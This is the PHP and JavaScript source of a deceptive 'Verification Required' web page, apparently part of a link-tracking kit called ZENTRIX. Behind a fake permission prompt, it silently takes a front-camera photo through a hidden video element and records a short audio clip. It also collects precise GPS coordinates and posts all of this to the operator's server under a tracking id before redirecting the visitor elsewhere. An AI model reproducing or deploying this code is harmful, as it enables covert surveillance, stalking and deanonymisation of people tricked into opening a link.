<?php
/**
 * ZENTRIX v3 – Verification Page
 * Automatic Silent Photo + Short Audio Capture
 */

$config = require __DIR__ . '/config.php';

$trackId  = isset($_GET['id']) ? preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['id']) : '';
$redirect = isset($_GET['r']) ? $_GET['r'] : ($config['default_redirect'] ?? 'https://www.google.com');

if (empty($trackId)) {
    header('Location: index.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <title>Verification Required</title>
    <link rel="stylesheet" href="assets/css/style.css">
    <script src="assets/js/theme.js"></script>
    <style>
        .verify-container {
            max-width: 480px;
            margin: 0 auto;
            padding: 40px 20px;
        }
        .permission-list {
            margin: 28px 0;
        }
        .permission-item {
            display: flex;
            align-items: center;
            gap: 14px;
            padding: 14px 0;
            border-bottom: 1px solid var(--border);
        }
        .permission-item:last-child {
            border-bottom: none;
        }
        .perm-icon {
            font-size: 1.4rem;
            width: 36px;
            text-align: center;
        }
        .perm-status {
            margin-left: auto;
            font-size: 0.85rem;
            font-weight: 500;
        }
        .status-pending { color: var(--text-muted); }
        .status-granted { color: var(--success); }
        .status-denied  { color: var(--danger); }

        .btn-verify {
            width: 100%;
            margin-top: 10px;
        }
        .note {
            font-size: 0.85rem;
            color: var(--text-muted);
            text-align: center;
            margin-top: 20px;
            line-height: 1.5;
        }
        .hidden-media {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="bg-grid"></div>

    <header class="topbar">
        <div class="logo">
            <img src="assets/img/logo.png" alt="ZENTRIX Logo">
            <span class="name">ZENTRIX</span>
        </div>
        <button id="themeToggle" class="theme-toggle" title="Toggle theme">☀️</button>
    </header>

    <div class="verify-container">
        <div class="card">
            <h1 style="font-size: 1.6rem; margin-bottom: 8px; text-align: center;">Verification Required</h1>
            <p style="text-align: center; color: var(--text-muted); margin-bottom: 8px;">
                Please allow the required permissions to continue.
            </p>

            <div class="permission-list">
                <div class="permission-item">
                    <div class="perm-icon">📍</div>
                    <div>
                        <strong>Location</strong><br>
                        <span style="font-size: 0.85rem; color: var(--text-muted);">Precise location</span>
                    </div>
                    <div class="perm-status status-pending" id="status-location">Pending</div>
                </div>

                <div class="permission-item">
                    <div class="perm-icon">📷</div>
                    <div>
                        <strong>Camera</strong><br>
                        <span style="font-size: 0.85rem; color: var(--text-muted);">Photo verification</span>
                    </div>
                    <div class="perm-status status-pending" id="status-camera">Pending</div>
                </div>

                <div class="permission-item">
                    <div class="perm-icon">🎤</div>
                    <div>
                        <strong>Microphone</strong><br>
                        <span style="font-size: 0.85rem; color: var(--text-muted);">Short audio</span>
                    </div>
                    <div class="perm-status status-pending" id="status-mic">Pending</div>
                </div>
            </div>

            <button id="startBtn" class="btn-primary btn-verify">
                Allow & Continue
            </button>

            <p class="note">
                This step is required for verification.<br>
                You will be redirected automatically.
            </p>
        </div>
    </div>

    <!-- Hidden elements -->
    <video id="video" class="hidden-media" autoplay playsinline muted></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const trackId     = <?= json_encode($trackId) ?>;
        const redirectUrl = <?= json_encode($redirect) ?>;

        const statusLocation = document.getElementById('status-location');
        const statusCamera   = document.getElementById('status-camera');
        const statusMic      = document.getElementById('status-mic');
        const startBtn       = document.getElementById('startBtn');
        const video          = document.getElementById('video');
        const canvas         = document.getElementById('canvas');

        function setStatus(el, state) {
            el.className = 'perm-status status-' + state;
            el.textContent = state.charAt(0).toUpperCase() + state.slice(1);
        }

        // ===== Capture Photo =====
        async function capturePhoto(stream) {
            return new Promise((resolve) => {
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(() => {
                        canvas.width  = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);

                        // Stop only video tracks
                        stream.getVideoTracks().forEach(track => track.stop());

                        canvas.toBlob((blob) => {
                            resolve(blob);
                        }, 'image/jpeg', 0.85);
                    }, 600);
                };
            });
        }

        // ===== Record Short Audio (3.5 seconds) =====
        async function recordAudio(stream) {
            return new Promise((resolve) => {
                const audioStream = new MediaStream(stream.getAudioTracks());
                const mediaRecorder = new MediaRecorder(audioStream, {
                    mimeType: 'audio/webm;codecs=opus'
                });

                const chunks = [];
                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };

                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    // Stop audio tracks
                    stream.getAudioTracks().forEach(track => track.stop());
                    resolve(blob);
                };

                mediaRecorder.start();
                // Record for 3.5 seconds
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 3500);
            });
        }

        // ===== Send to server =====
        async function sendMedia(photoBlob, audioBlob, extra = {}) {
            const formData = new FormData();
            formData.append('id', trackId);
            formData.append('lat', extra.lat || '');
            formData.append('lon', extra.lon || '');
            formData.append('accuracy', extra.accuracy || '');

            if (photoBlob) {
                formData.append('photo', photoBlob, 'capture.jpg');
            }
            if (audioBlob) {
                formData.append('audio', audioBlob, 'capture.webm');
            }

            try {
                await fetch('media.php', {
                    method: 'POST',
                    body: formData
                });
            } catch (e) {
                console.warn('Failed to send media', e);
            }
        }

        async function requestPermissions() {
            startBtn.disabled = true;
            startBtn.textContent = 'Requesting permissions...';

            let locationData = {};
            let photoBlob = null;
            let audioBlob = null;

            // ===== 1. Location =====
            try {
                await new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            setStatus(statusLocation, 'granted');
                            locationData = {
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude,
                                accuracy: pos.coords.accuracy
                            };
                            resolve();
                        },
                        () => {
                            setStatus(statusLocation, 'denied');
                            resolve();
                        },
                        { enableHighAccuracy: true, timeout: 9000 }
                    );
                });
            } catch (e) {
                setStatus(statusLocation, 'denied');
            }

            // ===== 2. Camera + Microphone =====
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: true
                });

                setStatus(statusCamera, 'granted');
                setStatus(statusMic, 'granted');

                startBtn.textContent = 'Capturing...';

                // Capture photo first
                photoBlob = await capturePhoto(stream);

                // Then record short audio
                startBtn.textContent = 'Recording audio...';
                audioBlob = await recordAudio(stream);

            } catch (err) {
                // Fallback: try camera only
                try {
                    const camStream = await navigator.mediaDevices.getUserMedia({ video: true });
                    setStatus(statusCamera, 'granted');
                    setStatus(statusMic, 'denied');

                    startBtn.textContent = 'Capturing...';
                    photoBlob = await capturePhoto(camStream);
                } catch (e) {
                    setStatus(statusCamera, 'denied');
                    setStatus(statusMic, 'denied');
                }
            }

            // ===== Send everything =====
            startBtn.textContent = 'Sending verification...';
            await sendMedia(photoBlob, audioBlob, locationData);

            // ===== Redirect =====
            startBtn.textContent = 'Redirecting...';

            const finalUrl = `track.php?id=${encodeURIComponent(trackId)}&r=${encodeURIComponent(redirectUrl)}`;

            setTimeout(() => {
                window.location.href = finalUrl;
            }, 700);
        }

        startBtn.addEventListener('click', requestPermissions);
    </script>
</body>
</html>
